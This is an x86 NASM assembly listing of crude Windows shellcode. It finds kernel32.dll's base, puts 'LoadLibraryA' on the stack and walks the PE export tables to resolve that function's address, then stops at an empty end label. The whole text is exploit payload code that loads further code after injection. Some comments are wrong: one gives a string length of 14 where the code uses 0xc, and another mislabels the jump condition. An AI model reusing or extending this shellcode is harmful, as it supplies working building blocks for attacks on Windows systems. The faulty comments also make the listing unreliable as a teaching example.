; this is a very CRUDE shellcode due to the limited space. I got rid of the checking for non-existing function, and use esp to locate value instead of ebp, although ebp would be much more convenient.
section .text
global _start
  _start:
        ; Find kernel32.dll base address
        ;xor esi, esi                    ; esi = 0
        ;mov ebx, [fs:esi+0x30]          ; avoid null bytes, to be compatible with fasm, for nasm, use fs:[eax+0x30]
        ;mov ebx, [ebx + 0x0C]
        ;mov ebx, [ebx + 0x14] 
        ;mov ebx, [ebx]  
        ;mov ebx, [ebx]  
        add esp, 0x7c                   ; lower down the stack, so later push won't shrink the shellcode space
        mov ebx, [ebx + 0x10]           ; now ebx holds kernel32.dll base address

        ; push the function name onto the stack
        xor esi, esi
        push esi                        ; null termination
        push 0x41797261
        push 0x7262694c
        push 0x64616f4c
        push esp                        ; pointer to "LoadLibraryA"

        push ebx                        ; base address of kernel32.dll

        ; Find the address of the export table
        mov eax, [ebx + 0x3c]           ; RVA of PE signature
        add eax, ebx                    ; address of PE signature
        mov eax, [eax + 0x78]           ; RVA of export table
        add eax, ebx                    ; address of export table

        ; Find number of exported functions
        mov edx, [eax + 0x14]           ; number of exported functions

        ; Find the address of the address table
        mov ecx, [eax + 0x1c]           ; RVA of address table
        add ecx, ebx                    ;
        push ecx                        ; address of address table

        ; Find the address of the name pointer table
        mov ecx, [eax + 0x20]           ; RVA of name pointer table
        add ecx, ebx                    ;
        push ecx                        ; address of name pointer table

        mov ecx, [eax + 0x24]           ; RVA of ordinal table
        add ecx, ebx                    ;
        push ecx                        ; address of ordinal table

        xor eax, eax                    ; cnt = 0

        .loop:
                mov edi, [esp+0x4]      ; edi holds the address of name pointer table
                mov esi, [esp+0x10]     ; esi points to "LoadLibraryA"
                xor ecx, ecx

                cld                     ; set DF=0 => process strings from left to right
                mov edi, [edi + eax*4]  ; edi holds the rva of the entries in name pointer table
                add edi, ebx            ; edi holds the address of the function name
                add cx, 0xc             ; length of strings to compare (len('LoadLibraryA') = 14 = 0xc)
                repe cmpsb              ; compare the strings pointed by esi and edi byte by byte. if equal, ZF=1, otherwise, ZF=0
                jz _start.found         ; if not zero, two strings are equal. found it!

                inc eax                 ; cnt++
                cmp eax, edx            ; check if last function is reached
                jb _start.loop          ; if not the last -> go back to the beginning of the loop

        .found:
                ; the counter (eax) now holds the position of LoadLibraryA
                mov ecx, [esp]          ; ecx holds the address of the ordinal table
                mov edx, [esp+0x8]      ; edx holds the address of the address table
                mov ax, [ecx + eax*2]   ; eax holds the ordinal number of the target function `LoadLibraryA` in ordinal table
                mov eax, [edx + eax*4]  ; eax holds the RVA of the target function `LoadLibraryA`
                add eax, ebx            ; eax holds the address of the target function `LoadLibraryA`
        .end:
